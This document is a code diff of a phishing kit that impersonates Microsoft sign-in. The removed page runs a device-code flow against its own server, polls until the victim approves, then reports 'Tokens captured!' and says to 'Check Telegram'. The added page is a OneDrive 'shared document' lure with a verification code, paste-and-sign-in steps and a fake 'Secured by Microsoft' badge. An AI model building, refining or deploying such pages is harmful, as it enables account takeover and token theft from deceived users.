@@ -1,707 +1,447 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    <title>Device Login | Microsoft</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OneDrive · Shared Document</title>
+  <style>
+    /* === Microsoft Fluent Design System — Unified Blue === */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
-            background: linear-gradient(145deg, #0b121c 0%, #162030 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            color: #e8edf4;
-        }
+    body {
+      background: #f2f4f8;
+      font-family: 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 24px;
+      margin: 0;
+    }
 
-        .container {
-            background: rgba(20, 32, 48, 0.92);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            padding: 44px 40px 36px;
-            border-radius: 20px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.04);
-            max-width: 480px;
-            width: 100%;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: all 0.3s ease;
-        }
+    .fluent-card {
+      max-width: 520px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06), 0 2px 6px rgba(0, 0, 0, 0.02);
+      padding: 36px 40px 28px;
+      border: 1px solid #eaeef2;
+      transition: box-shadow 0.2s ease;
+    }
 
-        /* ── Logo ── */
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo svg {
-            height: 44px;
-            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.3));
-        }
+    .fluent-card:hover {
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+    }
 
-        /* ── Headings ── */
-        h2 {
-            text-align: center;
-            font-weight: 300;
-            font-size: 26px;
-            letter-spacing: -0.3px;
-            color: #f0f6fc;
-            margin-bottom: 4px;
-        }
-        .subtitle {
-            text-align: center;
-            color: #849bb5;
-            font-size: 15px;
-            font-weight: 400;
-            margin-bottom: 28px;
-            letter-spacing: 0.2px;
-        }
+    /* === HEADER === */
+    .fluent-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 28px;
+    }
 
-        /* ── Code Display ── */
-        .code-display {
-            background: #0b121c;
-            padding: 28px 16px;
-            text-align: center;
-            border-radius: 14px;
-            margin: 8px 0 14px;
-            font-size: 48px;
-            font-weight: 700;
-            letter-spacing: 12px;
-            font-family: 'SF Mono', 'Courier New', monospace;
-            color: #6bcbff;
-            min-height: 100px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border: 2px dashed #1a3550;
-            transition: all 0.3s ease;
-            text-shadow: 0 0 30px rgba(107, 203, 255, 0.08);
-            word-break: break-all;
-            user-select: all;
-        }
-        .code-display.loading {
-            color: #4a6a8a;
-            font-size: 18px;
-            letter-spacing: 3px;
-            border-color: #1a2a3a;
-        }
-        .code-display.error {
-            color: #f87171;
-            border-color: #5a1a1a;
-            text-shadow: 0 0 30px rgba(248, 113, 113, 0.05);
-        }
-        .code-display.approved {
-            color: #34d399;
-            border-color: #1a4a2a;
-            text-shadow: 0 0 30px rgba(52, 211, 153, 0.08);
-        }
+    .fluent-header svg {
+      width: 34px;
+      height: 34px;
+      flex-shrink: 0;
+      fill: #0078D4;
+    }
 
-        /* ── URL Display ── */
-        .url-display {
-            background: #0b121c;
-            padding: 12px 16px;
-            border-radius: 10px;
-            text-align: center;
-            font-family: 'SF Mono', 'Courier New', monospace;
-            font-size: 14px;
-            word-break: break-all;
-            margin: 10px 0 14px;
-            border: 1px solid #1a2a3a;
-            color: #6b8baa;
-            transition: all 0.2s ease;
-        }
-        .url-display a {
-            color: #6bcbff;
-            text-decoration: none;
-            border-bottom: 1px dotted rgba(107, 203, 255, 0.2);
-        }
-        .url-display a:hover {
-            border-bottom-color: #6bcbff;
-        }
+    .fluent-header span {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1a1a;
+      letter-spacing: -0.2px;
+    }
 
-        /* ── Instructions ── */
-        .instructions {
-            color: #7f9bb3;
-            font-size: 13.5px;
-            text-align: center;
-            margin: 16px 0 20px;
-            line-height: 1.9;
-            letter-spacing: 0.1px;
-        }
-        .instructions span {
-            color: #6bcbff;
-            font-weight: 600;
-        }
+    /* === CIRCLED PADLOCK (unified blue) === */
+    .lock-badge {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
 
-        /* ── Status ── */
-        .status {
-            text-align: center;
-            margin: 12px 0 16px;
-            padding: 12px 16px;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 500;
-            min-height: 48px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.3s ease;
-        }
-        .status.idle {
-            background: rgba(10, 14, 23, 0.5);
-            color: #7f9bb3;
-            border: 1px solid #1a2a3a;
-        }
-        .status.pending {
-            background: rgba(251, 191, 36, 0.06);
-            color: #fbbf24;
-            border: 1px solid rgba(251, 191, 36, 0.15);
-        }
-        .status.approved {
-            background: rgba(52, 211, 153, 0.06);
-            color: #34d399;
-            border: 1px solid rgba(52, 211, 153, 0.15);
-        }
-        .status.error {
-            background: rgba(248, 113, 113, 0.06);
-            color: #f87171;
-            border: 1px solid rgba(248, 113, 113, 0.15);
-        }
-        .status.info {
-            background: rgba(107, 203, 255, 0.06);
-            color: #6bcbff;
-            border: 1px solid rgba(107, 203, 255, 0.1);
-        }
+    .lock-badge svg {
+      width: 38px;
+      height: 38px;
+    }
 
-        .status .spinner-dot {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #fbbf24;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+    .lock-badge circle,
+    .lock-badge rect,
+    .lock-badge path {
+      stroke: #0078D4;
+    }
 
-        /* ── Buttons ── */
-        .btn {
-            background: linear-gradient(145deg, #2563eb, #1d4ed8);
-            color: white;
-            padding: 14px 20px;
-            border: none;
-            border-radius: 12px;
-            width: 100%;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 16px rgba(37, 99, 235, 0.2);
-            letter-spacing: 0.2px;
-        }
-        .btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 24px rgba(37, 99, 235, 0.35);
-            background: linear-gradient(145deg, #2b6ff0, #1d4ed8);
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
+    .heading-wrapper {
+      text-align: center;
+      margin-bottom: 6px;
+    }
 
-        .btn.secondary {
-            background: rgba(255, 255, 255, 0.04);
-            box-shadow: none;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            color: #c8d6e5;
-        }
-        .btn.secondary:hover {
-            background: rgba(255, 255, 255, 0.08);
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
-            border-color: rgba(255, 255, 255, 0.12);
-        }
+    .fluent-heading {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin: 0;
+    }
 
-        .btn.success {
-            background: linear-gradient(145deg, #059669, #047857);
-            box-shadow: 0 4px 16px rgba(5, 150, 105, 0.2);
-        }
-        .btn.success:hover {
-            box-shadow: 0 6px 24px rgba(5, 150, 105, 0.35);
-            background: linear-gradient(145deg, #06a87a, #047857);
-        }
+    .fluent-sub {
+      font-size: 15px;
+      color: #3b3b3b;
+      margin-bottom: 24px;
+      line-height: 1.5;
+      text-align: center;
+    }
 
-        .flex-row {
-            display: flex;
-            gap: 10px;
-            margin-top: 12px;
-        }
-        .flex-row .btn {
-            width: auto;
-            flex: 1;
-        }
+    /* === DARK CODE BLOCK — CENTERED === */
+    .code-area {
+      background: #1e1e2f;
+      border-radius: 8px;
+      padding: 16px 20px;
+      border: 1px solid #2a2a4a;
+      margin-bottom: 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.3);
+    }
 
-        /* ── Spinner ── */
-        .spinner {
-            display: none;
-            text-align: center;
-            margin: 6px 0 10px;
-        }
-        .spinner.active {
-            display: block;
-        }
-        .spinner .ring {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255, 255, 255, 0.04);
-            border-top: 3px solid #6bcbff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto;
-        }
-        .spinner p {
-            margin-top: 10px;
-            color: #4a6a8a;
-            font-size: 13px;
-            font-weight: 400;
-        }
+    .code-label {
+      font-size: 11px;
+      font-weight: 600;
+      color: #aab;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      text-align: center;
+    }
 
-        /* ── Error Display ── */
-        .error-text {
-            color: #f87171;
-            text-align: center;
-            margin: 6px 0 8px;
-            font-size: 14px;
-            font-weight: 400;
-            min-height: 22px;
-        }
+    .code-value {
+      font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
+      font-size: 32px;
+      font-weight: 700;
+      letter-spacing: 3px;
+      color: #4FC3F7;
+      background: transparent;
+      border: none;
+      outline: none;
+      text-shadow: 0 0 10px rgba(79, 195, 247, 0.2);
+      display: block;
+      text-align: center;
+      margin: 2px 0 4px 0;
+    }
 
-        /* ── Log Area ── */
-        .log-area {
-            background: rgba(0, 0, 0, 0.35);
-            padding: 12px 14px;
-            border-radius: 10px;
-            max-height: 110px;
-            overflow-y: auto;
-            font-family: 'SF Mono', 'Courier New', monospace;
-            font-size: 11px;
-            color: #3a5a7a;
-            margin-top: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            scrollbar-width: thin;
-            scrollbar-color: #1a2a3a transparent;
-        }
-        .log-area::-webkit-scrollbar {
-            width: 4px;
-        }
-        .log-area::-webkit-scrollbar-track {
-            background: transparent;
-        }
-        .log-area::-webkit-scrollbar-thumb {
-            background: #1a2a3a;
-            border-radius: 10px;
-        }
+    .copy-btn {
+      background: #2a2a4a;
+      border: 1px solid #3a3a5a;
+      padding: 6px 18px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #c8d0e0;
+      cursor: pointer;
+      transition: background 0.15s ease, transform 0.1s ease, border-color 0.15s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      white-space: nowrap;
+    }
 
-        .log-area .entry {
-            padding: 3px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .log-area .entry:last-child {
-            border-bottom: none;
-        }
-        .log-area .entry.error {
-            color: #f87171;
-        }
-        .log-area .entry.success {
-            color: #34d399;
-        }
-        .log-area .entry.warning {
-            color: #fbbf24;
-        }
-        .log-area .entry.info {
-            color: #6bcbff;
-        }
+    .copy-btn:hover {
+      background: #3a3a5e;
+      border-color: #4FC3F7;
+      color: #ffffff;
+    }
 
-        /* ── Responsive ── */
-        @media (max-width: 520px) {
-            .container {
-                padding: 28px 20px 24px;
-            }
-            .code-display {
-                font-size: 34px;
-                letter-spacing: 8px;
-                padding: 20px 12px;
-                min-height: 76px;
-            }
-            h2 {
-                font-size: 22px;
-            }
-            .flex-row {
-                flex-direction: column;
-            }
-            .flex-row .btn {
-                width: 100%;
-            }
-        }
+    .copy-btn:hover svg {
+      stroke: #4FC3F7;
+    }
 
-        @media (max-width: 380px) {
-            .code-display {
-                font-size: 26px;
-                letter-spacing: 4px;
-                padding: 16px 10px;
-                min-height: 64px;
-            }
-            .container {
-                padding: 20px 14px;
-            }
-        }
+    .copy-btn:active {
+      transform: scale(0.96);
+    }
 
-        /* ── Focus styles ── */
-        .btn:focus-visible {
-            outline: 2px solid #6bcbff;
-            outline-offset: 2px;
-        }
+    .copy-btn svg {
+      stroke: #c8d0e0;
+      transition: stroke 0.15s ease;
+    }
 
-        /* ── Fade-in animation ── */
-        .container {
-            animation: fadeUp 0.5s ease-out;
-        }
-        @keyframes fadeUp {
-            0% { opacity: 0; transform: translateY(20px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-    </style>
+    /* === STEPS — UNIFIED BLUE CIRCLES === */
+    .steps-list {
+      list-style: none;
+      padding: 0;
+      margin: 0 0 28px 0;
+      background: #fafcfe;
+      border-radius: 6px;
+      border: 1px solid #eaeef2;
+      padding: 12px 18px;
+    }
+
+    .steps-list li {
+      font-size: 14px;
+      color: #2b2b2b;
+      padding: 7px 0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 1px solid #f0f3f7;
+    }
+
+    .steps-list li:last-child {
+      border-bottom: none;
+    }
+
+    .step-circle {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 24px;
+      background: #0078D4;
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 13px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .key-hint {
+      background: #eef2f8;
+      padding: 0 10px;
+      border-radius: 4px;
+      font-family: 'Segoe UI', monospace;
+      font-size: 13px;
+      font-weight: 500;
+      border: 1px solid #d0d6de;
+    }
+
+    /* === CONTINUE BUTTON — UNIFIED BLUE === */
+    .continue-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      background: #0078D4;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      padding: 13px 0;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s ease, box-shadow 0.15s ease;
+      text-align: center;
+      text-decoration: none;
+      margin-bottom: 28px;
+      letter-spacing: 0.2px;
+    }
+
+    .continue-btn svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+
+    .continue-btn:hover {
+      background: #0067B8;
+      box-shadow: 0 2px 12px rgba(0, 120, 212, 0.25);
+    }
+
+    .continue-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* === FOOTER — CENTERED === */
+    .fluent-footer {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      border-top: 1px solid #eaeef2;
+      padding-top: 20px;
+    }
+
+    .footer-secured {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #1a1a1a;
+      font-weight: 500;
+      font-size: 12px;
+    }
+
+    .footer-secured svg {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+      stroke: #107C10;
+    }
+
+    .footer-copy {
+      color: #777;
+      font-size: 11px;
+      text-align: center;
+    }
+
+    @media (max-width: 500px) {
+      .fluent-card {
+        padding: 24px 18px;
+      }
+      .code-value {
+        font-size: 26px;
+        letter-spacing: 2px;
+      }
+      .lock-badge svg {
+        width: 32px;
+        height: 32px;
+      }
+      .fluent-heading {
+        font-size: 18px;
+      }
+      .continue-btn {
+        font-size: 14px;
+        gap: 8px;
+      }
+      .continue-btn svg {
+        width: 18px;
+        height: 18px;
+      }
+      .step-circle {
+        width: 22px;
+        height: 22px;
+        font-size: 12px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container" id="app">
-        <!-- Logo -->
-        <div class="logo">
-            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:44px;">
-                <rect x="1" y="1" width="21" height="21" rx="4" fill="#f25022"/>
-                <rect x="1" y="1" width="9" height="9" rx="2" fill="#7fba00"/>
-                <rect x="12" y="1" width="9" height="9" rx="2" fill="#00a4ef"/>
-                <rect x="1" y="12" width="9" height="9" rx="2" fill="#ffb900"/>
-                <rect x="12" y="12" width="9" height="9" rx="2" fill="#f25022"/>
-            </svg>
-        </div>
+<div class="fluent-card">
 
-        <h2>Device Login</h2>
-        <p class="subtitle">Enter the code on your device to sign in</p>
+  <!-- OneDrive with cloud logo -->
+  <div class="fluent-header">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M10.5 3.5c-2.5 0-4.5 2-4.5 4.5 0 1.2.5 2.3 1.2 3.1C5.8 12.3 4.5 14.1 4.5 16c0 2.5 2 4.5 4.5 4.5h10c2.5 0 4.5-2 4.5-4.5 0-2.1-1.4-3.9-3.3-4.5.1-.5.2-1 .2-1.5 0-2.5-2-4.5-4.5-4.5-.7 0-1.4.2-2 .5-.4-.7-1.1-1.2-1.9-1.5z" />
+    </svg>
+    <span>OneDrive</span>
+  </div>
 
-        <!-- Code Display -->
-        <div class="code-display loading" id="deviceCode">⟳ Generating...</div>
+  <!-- Circled padlock (unified blue) -->
+  <div class="lock-badge">
+    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10" stroke-width="1.5" fill="none" />
+      <rect x="7" y="11" width="10" height="8" rx="1.5" ry="1.5" fill="none" stroke-width="1.5" />
+      <path d="M9 11V8a3 3 0 0 1 6 0v3" fill="none" stroke-width="1.5" />
+    </svg>
+  </div>
 
-        <!-- URL -->
-        <div class="url-display" id="deviceUrl">
-            <a href="https://login.microsoft.com/device" target="_blank" rel="noopener">
-                https://login.microsoft.com/device
-            </a>
-        </div>
+  <!-- Heading -->
+  <div class="heading-wrapper">
+    <div class="fluent-heading">View shared document</div>
+  </div>
 
-        <!-- Instructions -->
-        <div class="instructions">
-            <span>1.</span> Open the link above on your device &nbsp;·&nbsp;
-            <span>2.</span> Enter the code &nbsp;·&nbsp;
-            <span>3.</span> Approve
-        </div>
+  <!-- Subtitle -->
+  <div class="fluent-sub">
+    Someone shared a document with you on OneDrive.<br>
+    Verify your identity with Microsoft to access it.
+  </div>
 
-        <!-- Status -->
-        <div id="status" class="status idle">
-            <span class="spinner-dot"></span> Starting device flow...
-        </div>
+  <!-- Centered code block -->
+  <div class="code-area">
+    <div class="code-label">YOUR VERIFICATION CODE</div>
+    <span class="code-value" id="verificationCode">BRM38F626</span>
+    <button class="copy-btn" id="copyBtn">
+      <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="5" y="5" width="8" height="8" rx="1" />
+        <path d="M3 11V3c0-.6.4-1 1-1h8" />
+      </svg>
+      Copy Code
+    </button>
+  </div>
 
-        <!-- Spinner -->
-        <div class="spinner" id="spinner">
-            <div class="ring"></div>
-            <p>Waiting for device approval...</p>
-        </div>
+  <!-- Steps — unified blue circles -->
+  <ul class="steps-list">
+    <li><span class="step-circle">1</span> Copy the code above</li>
+    <li><span class="step-circle">2</span> Click continue and paste <span class="key-hint">Ctrl+V</span></li>
+    <li><span class="step-circle">3</span> Sign in with your Microsoft account</li>
+  </ul>
 
-        <!-- Primary Button -->
-        <button class="btn" id="checkBtn">🔄 Check Status</button>
+  <!-- Continue button — unified blue -->
+  <button class="continue-btn" id="continueBtn">
+    <svg viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+      <rect x="2" y="2" width="9" height="9" fill="#F25022" />
+      <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
+      <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
+      <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
+    </svg>
+    Continue to Microsoft
+  </button>
 
-        <!-- Secondary Buttons -->
-        <div class="flex-row">
-            <button class="btn secondary" id="copyBtn">📋 Copy Code</button>
-            <button class="btn secondary" id="refreshBtn">🔄 New Code</button>
-        </div>
+  <!-- Centered footer -->
+  <div class="fluent-footer">
+    <span class="footer-secured">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#107C10" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="4" y="11" width="16" height="11" rx="2" ry="2" />
+        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+      </svg>
+      Secured by Microsoft
+    </span>
+    <span class="footer-copy">© 2026 Microsoft Corporation. All rights reserved.</span>
+  </div>
 
-        <!-- Error -->
-        <div id="errorDisplay" class="error-text"></div>
+</div>
 
-        <!-- Log -->
-        <div class="log-area" id="logArea">
-            <div class="entry info">💡 Ready. Generating device code...</div>
-        </div>
-    </div>
+<script>
+  (function() {
+    const codeSpan = document.getElementById('verificationCode');
+    const copyBtn = document.getElementById('copyBtn');
+    const continueBtn = document.getElementById('continueBtn');
 
-    <script>
-        (function() {
-            'use strict';
+    copyBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      const code = codeSpan.textContent.trim();
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(code).then(() => {
+          const orig = copyBtn.innerHTML;
+          copyBtn.innerHTML = '✓ Copied!';
+          setTimeout(() => { copyBtn.innerHTML = orig; }, 1800);
+        }).catch(() => fallbackCopy(code));
+      } else {
+        fallbackCopy(code);
+      }
+    });
 
-            // ── DOM refs ──
-            const API_BASE = window.location.origin;
-            const codeDisplay = document.getElementById('deviceCode');
-            const urlDisplay = document.getElementById('deviceUrl');
-            const statusEl = document.getElementById('status');
-            const spinner = document.getElementById('spinner');
-            const checkBtn = document.getElementById('checkBtn');
-            const copyBtn = document.getElementById('copyBtn');
-            const refreshBtn = document.getElementById('refreshBtn');
-            const errorDisplay = document.getElementById('errorDisplay');
-            const logArea = document.getElementById('logArea');
+    function fallbackCopy(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.top = '-9999px';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      try {
+        document.execCommand('copy');
+        const orig = copyBtn.innerHTML;
+        copyBtn.innerHTML = '✓ Copied!';
+        setTimeout(() => { copyBtn.innerHTML = orig; }, 1800);
+      } catch (err) {
+        alert('Unable to copy. Please select the code manually.');
+      }
+      document.body.removeChild(ta);
+    }
 
-            // ── State ──
-            let deviceCode = '';
-            let userCode = '';
-            let pollInterval = null;
-            let isPolling = false;
-            let flowActive = false;
-
-            // ── Logging ──
-            function addLog(msg, type = 'info') {
-                const entry = document.createElement('div');
-                entry.className = `entry ${type}`;
-                const time = new Date().toLocaleTimeString('en-US', { hour12: false });
-                const icons = { info: '💡', success: '✅', error: '❌', warning: '⚠️', pending: '⏳' };
-                entry.textContent = `[${time}] ${icons[type] || '•'} ${msg}`;
-                logArea.prepend(entry);
-                if (logArea.children.length > 50) logArea.removeChild(logArea.lastChild);
-            }
-
-            // ── Status ──
-            function setStatus(msg, type = 'idle', showSpinner = false) {
-                statusEl.className = `status ${type}`;
-                if (showSpinner) {
-                    statusEl.innerHTML = `<span class="spinner-dot"></span> ${msg}`;
-                } else {
-                    statusEl.textContent = msg;
-                }
-            }
-
-            function setError(msg) {
-                errorDisplay.textContent = msg;
-                if (msg) addLog(`❌ ${msg}`, 'error');
-            }
-
-            // ── Copy ──
-            async function copyCode() {
-                const code = codeDisplay.textContent;
-                if (!code || code === '⟳ Generating...' || code === '⚠️ Error') {
-                    setError('No code to copy. Generate one first.');
-                    return;
-                }
-                try {
-                    await navigator.clipboard.writeText(code);
-                    setStatus('✅ Copied to clipboard!', 'approved');
-                    addLog('📋 Copied code to clipboard', 'success');
-                } catch {
-                    const ta = document.createElement('textarea');
-                    ta.value = code;
-                    document.body.appendChild(ta);
-                    ta.select();
-                    document.execCommand('copy');
-                    ta.remove();
-                    setStatus('✅ Copied!', 'approved');
-                }
-            }
-
-            // ── Polling ──
-            async function pollForToken(manual = false) {
-                if (!deviceCode || isPolling) return;
-                isPolling = true;
-
-                try {
-                    const response = await fetch(`${API_BASE}/device/token`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ device_code: deviceCode })
-                    });
-
-                    const data = await response.json();
-
-                    if (data.access_token) {
-                        clearInterval(pollInterval);
-                        pollInterval = null;
-                        flowActive = false;
-                        isPolling = false;
-                        setStatus('✅ Approved! Tokens captured!', 'approved');
-                        codeDisplay.className = 'code-display approved';
-                        addLog('✅ TOKENS OBTAINED! Check Telegram.', 'success');
-                        addLog(`🔑 Access: ${data.access_token.slice(0, 24)}...`, 'success');
-                        spinner.classList.remove('active');
-                        setError('');
-                        return;
-                    }
-
-                    if (data.error === 'authorization_pending') {
-                        setStatus('⏳ Waiting for approval on your device...', 'pending', true);
-                        addLog('⏳ Still waiting for user approval...', 'pending');
-                        isPolling = false;
-                        return;
-                    }
-
-                    if (data.error === 'expired_token') {
-                        clearInterval(pollInterval);
-                        pollInterval = null;
-                        flowActive = false;
-                        isPolling = false;
-                        setStatus('⏰ Code expired. Generate a new one.', 'error');
-                        codeDisplay.className = 'code-display error';
-                        codeDisplay.textContent = '⏰ EXPIRED';
-                        addLog('⏰ Code expired. Click "New Code".', 'error');
-                        spinner.classList.remove('active');
-                        return;
-                    }
-
-                    if (data.error) {
-                        setStatus(`⚠️ ${data.error}`, 'error');
-                        addLog(`⚠️ ${data.error}`, 'warning');
-                        isPolling = false;
-                        return;
-                    }
-
-                    setStatus('⚠️ Unexpected response', 'error');
-                    addLog(`⚠️ ${JSON.stringify(data).slice(0, 100)}`, 'warning');
-                    isPolling = false;
-
-                } catch (err) {
-                    console.error('Poll error:', err);
-                    setStatus(`❌ Poll error: ${err.message}`, 'error');
-                    addLog(`❌ ${err.message}`, 'error');
-                    isPolling = false;
-                }
-            }
-
-            // ── Start Flow ──
-            async function startDeviceFlow() {
-                if (flowActive) return;
-                flowActive = true;
-                setStatus('⏳ Generating device code...', 'pending', true);
-                codeDisplay.textContent = '⟳ Loading...';
-                codeDisplay.className = 'code-display loading';
-                spinner.classList.add('active');
-                setError('');
-
-                try {
-                    addLog('📱 Requesting device code from Microsoft...', 'info');
-                    const response = await fetch(`${API_BASE}/device/request`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' }
-                    });
-
-                    if (!response.ok) {
-                        const errText = await response.text();
-                        throw new Error(`HTTP ${response.status}: ${errText}`);
-                    }
-
-                    const data = await response.json();
-
-                    if (data.error) throw new Error(data.error_description || data.error);
-
-                    deviceCode = data.device_code;
-                    userCode = data.user_code;
-
-                    codeDisplay.textContent = userCode;
-                    codeDisplay.className = 'code-display';
-                    urlDisplay.innerHTML = `<a href="${data.verification_uri || 'https://login.microsoft.com/device'}" target="_blank" rel="noopener">${data.verification_uri || 'https://login.microsoft.com/device'}</a>`;
-                    setStatus(`⏳ Code: ${userCode} — Waiting for approval...`, 'pending', true);
-                    addLog(`✅ Code generated: ${userCode}`, 'success');
-                    addLog(`🔗 ${data.verification_uri}`, 'info');
-                    spinner.classList.remove('active');
-
-                    if (pollInterval) clearInterval(pollInterval);
-                    const intervalMs = (data.interval || 5) * 1000 + 500;
-                    pollInterval = setInterval(pollForToken, intervalMs);
-                    setTimeout(pollForToken, 1000);
-                    flowActive = false;
-
-                } catch (err) {
-                    console.error('Device flow error:', err);
-                    setStatus(`❌ Error: ${err.message}`, 'error');
-                    codeDisplay.textContent = '⚠️ Error';
-                    codeDisplay.className = 'code-display error';
-                    addLog(`❌ ${err.message}`, 'error');
-                    spinner.classList.remove('active');
-                    flowActive = false;
-                    setError(err.message);
-                }
-            }
-
-            // ── Event listeners ──
-            refreshBtn.addEventListener('click', () => {
-                if (pollInterval) {
-                    clearInterval(pollInterval);
-                    pollInterval = null;
-                }
-                isPolling = false;
-                flowActive = false;
-                deviceCode = '';
-                userCode = '';
-                codeDisplay.textContent = '⟳ Generating...';
-                codeDisplay.className = 'code-display loading';
-                setStatus('🔄 Generating new code...', 'idle');
-                spinner.classList.remove('active');
-                setError('');
-                addLog('🔄 Requesting new device code...', 'info');
-                setTimeout(startDeviceFlow, 300);
-            });
-
-            checkBtn.addEventListener('click', () => {
-                if (deviceCode) {
-                    addLog('🔍 Manual status check...', 'info');
-                    pollForToken(true);
-                } else {
-                    setError('No active code. Generate one first.');
-                }
-            });
-
-            copyBtn.addEventListener('click', copyCode);
-
-            // ── Keyboard shortcuts ──
-            document.addEventListener('keydown', (e) => {
-                if ((e.ctrlKey || e.metaKey) && e.key === 'c') {
-                    e.preventDefault();
-                    copyCode();
-                }
-                if (e.key === 'r' && !e.ctrlKey && !e.metaKey) {
-                    e.preventDefault();
-                    refreshBtn.click();
-                }
-            });
-
-            // ── Init ──
-            window.addEventListener('DOMContentLoaded', () => {
-                setTimeout(startDeviceFlow, 600);
-            });
-
-            // ── Console branding ──
-            console.log('%c🍟♤  Device Code UI v4.0  🐟🎁', 'font-size:18px; font-weight:bold; color:#6bcbff;');
-            console.log('%c🔑 Shortcuts: [R] New Code  |  [Ctrl+C] Copy', 'font-size:13px; color:#7f9bb3;');
-
-        })();
-    </script>
+    continueBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('🔐 Fluent UI — document tile removed.\nIn production, this would initiate Microsoft OAuth flow.');
+    });
+  })();
+</script>
 
 </body>
 </html>
